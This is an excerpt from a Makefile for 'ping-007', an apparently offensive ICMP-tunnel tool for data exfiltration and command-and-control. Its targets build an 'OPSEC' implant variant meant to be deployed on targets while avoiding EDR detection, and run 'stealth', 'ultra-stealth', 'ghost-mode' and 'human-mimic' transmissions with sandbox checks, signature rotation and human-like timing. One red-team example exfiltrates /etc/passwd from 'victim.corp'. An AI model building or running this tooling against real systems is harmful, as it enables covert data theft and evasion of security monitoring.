...
help:
	...
	@echo "  $(GREEN)build-no-c2$(RESET)   - Build OPSEC variant without C2 shell (exfil+listen only)"
...
# build-no-c2  OPSEC variant: exfil + listener only, interactive C2 shell excluded.
# Use this for implants deployed on target  reduces binary signature and removes
# the bidirectional shell that most EDRs flag on behavior.
build-no-c2: check-deps
	@echo "$(CYAN)Building OPSEC variant (no C2 shell)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags noc2 \
		-ldflags "-s -w -X main.version=$(VERSION)" \
		-trimpath -o $(BUILD_DIR)/$(BINARY_NAME)-noc2 ./cmd/ping-007
	@echo "$(GREEN)No-C2 build: $(BUILD_DIR)/$(BINARY_NAME)-noc2$(RESET)"
	@echo "$(YELLOW)Shell command excluded  exfil and listen remain functional$(RESET)"
...
basic: build ## Basic ICMP transmission (requires TARGET and DATA)
	@echo "$(CYAN)Basic ICMP Operation  AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC (random per session)$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make basic TARGET=192.168.1.100 DATA='test message' PASSWORD='secret123'$(RESET)"; \
		echo "$(YELLOW) Crypto: AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC  key: PBKDF2-SHA256 100k iter$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)  No password provided - using random keys (non-interoperable)$(RESET)"; \
...
stealth: build ## Stealth ICMP transmission with full evasion stack (requires TARGET)
	@echo "$(CYAN) Stealth Operation: sandbox check  adaptive timing  OS signature  AES-256-GCM$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
	...
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)  No password - using random keys (receiver needs same password for decryption)$(RESET)"; \
...
listen: build ## Data listener with automatic decryption (requires PASSWORD)
	...
	@if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)  No password - will only receive unencrypted data$(RESET)"; \
...
install-deps: ## Install all optional dependencies (UPX, security tools)
	...
	@if command -v apt-get >/dev/null 2>&1; then \
		sudo apt-get install -y binutils file xxd bsdmainutils; \
	elif command -v yum >/dev/null 2>&1; then \
		sudo yum install -y binutils file xxd; \
	fi
...
go-setup: ## Install Go and development tools
	@echo "$(CYAN)  Setting up Go environment...$(RESET)"
...
examples: ## Show usage examples
	...
	@echo ""
	@echo "$(YELLOW)Basic Operations (AES-256-GCM / ChaCha20-Poly1305 / XOR-CFB-HMAC):$(RESET)"
...
redteam-examples: ## Red team operation examples
	...
	@echo "  $(GREEN)make exfil TARGET=victim.corp FILE=/etc/passwd METHOD=icmp_tunnel$(RESET)"
...
crypto-tests: ## Run cryptographic unit tests (no binary required)
	@echo "$(CYAN)Cryptographic Unit Tests$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(BLUE)AES-256-GCM · ChaCha20-Poly1305 · XOR-CFB-HMAC$(RESET)"
	@go test -v -race ./internal/crypto/...
	@echo ""
	@echo "$(GREEN)Cryptographic tests complete$(RESET)"

crypto-demo: build ## Demonstrate cryptographic capabilities
	@echo "$(CYAN) Cryptographic Capabilities Demonstration$(RESET)"
	@echo "$(WHITE)══════════════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Demonstration of ping-007 cryptographic features:$(RESET)"
	@echo ""
	...
	@sudo $(BUILD_DIR)/$(BINARY_NAME) listen --output ./crypto-demo --timeout 15 --password "demo123" & LISTENER_PID=$$!; \
	sleep 2; \
...
ultra-stealth: build ## Ultra-stealth mode with maximum evasion
	@echo "$(CYAN)  Ultra-Stealth Mode with Advanced Evasion$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make ultra-stealth TARGET=192.168.1.100 PASSWORD='stealth-ops'$(RESET)"; \
		echo "$(YELLOW)   Features: Human timing + Signature rotation + Maximum OPSEC$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)  Ultra-stealth requires password for encryption$(RESET)"; \
		echo "$(BLUE) Recommended: PASSWORD='ultra-$(shell date +%Y%m%d)'$(RESET)"; \
		exit 1; \
	fi; \
	echo "$(GREEN)  Activating ultra-stealth evasion techniques:$(RESET)"; \
...
ghost-mode: build ## Ghost mode - Near-undetectable transmission
	...
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)  Ghost mode requires password$(RESET)"; \
...
human-mimic: build ## Human-like behavior simulation
	@echo "$(CYAN)  Human Behavior Mimicry$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make human-mimic TARGET=192.168.1.100 PASSWORD='human-test'$(RESET)"; \
		echo "$(YELLOW)   Simulates realistic human ping testing behavior$(RESET)"; \
		exit 1; \
	fi; \
	echo "$(GREEN)  Simulating human network testing behavior:$(RESET)"; \
...
natural-test: build ## Natural ping test simulation (like human doing ping -c N)
	@echo "$(CYAN)  Natural Ping Test Simulation$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make natural-test TARGET=192.168.1.100 COUNT=10 PASSWORD='test123'$(RESET)"; \
		echo "$(YELLOW)   Simulates: Human doing 'ping -c N' with natural timing$(RESET)"; \
		exit 1; \
	fi; \
	COUNT=$(if $(COUNT),$(COUNT),10); \
	echo "$(GREEN)  Simulating natural ping test sequence:$(RESET)"; \
	...
	for i in $$(seq 1 $$COUNT); do \
		...
		if [ $$i -lt $$COUNT ]; then \
			if [ $$(($$i % 5)) -eq 0 ]; then \
				echo "$(YELLOW)  Natural pause (user checking results)...$(RESET)"; \
				sleep $$(($$RANDOM % 10 + 5)); \
			fi; \
		fi; \
	done; \
...
# CI/CD helper target
ci: clean deps lint test security-check build-all
